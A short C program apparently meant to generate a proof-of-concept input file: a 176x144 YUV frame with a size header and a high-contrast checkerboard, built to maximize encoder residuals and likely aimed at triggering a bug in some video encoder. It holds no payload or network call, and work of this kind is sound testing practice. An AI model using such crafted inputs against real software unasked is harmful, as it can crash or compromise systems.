#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    uint32_t width = 176;
    uint32_t height = 144;

    // Write width (4 bytes, little-endian)
    fputc(width & 0xFF, f);
    fputc((width >> 8) & 0xFF, f);
    fputc((width >> 16) & 0xFF, f);
    fputc((width >> 24) & 0xFF, f);

    // Write height (4 bytes, little-endian)
    fputc(height & 0xFF, f);
    fputc((height >> 8) & 0xFF, f);
    fputc((height >> 16) & 0xFF, f);
    fputc((height >> 24) & 0xFF, f);

    // Write Y plane with high-frequency pattern to maximize residual
    for (uint32_t y = 0; y < height; y++) {
        for (uint32_t x = 0; x < width; x++) {
            // Checkerboard pattern with extreme values
            if ((x + y) & 1) {
                fputc(0x00, f);  // black
            } else {
                fputc(0xFF, f);  // white
            }
        }
    }

    // Write U plane (flat neutral)
    for (uint32_t i = 0; i < (width/2) * (height/2); i++) {
        fputc(0x80, f);
    }

    // Write V plane (flat neutral)
    for (uint32_t i = 0; i < (width/2) * (height/2); i++) {
        fputc(0x80, f);
    }

    fclose(f);
    return 0;
}